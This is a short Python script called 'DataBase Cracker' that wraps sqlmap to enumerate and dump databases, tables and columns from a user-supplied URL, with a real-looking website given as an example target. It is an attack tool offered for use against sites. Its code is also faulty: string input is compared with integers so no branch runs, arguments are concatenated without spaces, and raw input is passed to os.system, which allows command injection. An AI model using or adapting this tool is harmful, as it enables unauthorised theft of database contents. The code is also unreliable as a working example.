#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet DataBase Cracker")


print("""

DataBase Tool 
1-I know the link
2-I know both database and the link
3-I know database,table and the link
4-I know above and extra column name 


Example:https://suesupriano.com/article.php?id=25




""")


op1 = input("log the operation")

if (op1==1):
	link=input("Please link?")
	os.system("sqlmap -u" + link + "--dbs --random-agent")
elif (op1==2):
	link=input("Please link?")
	database=input("database?")
	os.system("sqlmap -u" + link + "-D" +database +"--tables --random-agent")
elif (op1==3):
	link=input("Please link?")
	database=input("database?")
	table=input("table?")
	os.system("sqlmap -u" + link + "-D" +database + "-T"+ table + "--columns --random-agent")
			
elif (op1==4):
	link=input("Please link?")
	database=input("database?")
	table=input("table?")
	column=input("column?")
	os.system("sqlmap -u" + link + "-D" +database + "-T"+ table + " -C " + column+ "--dump --	random-agent")
			
			
			


            #Kosula girmiyor:(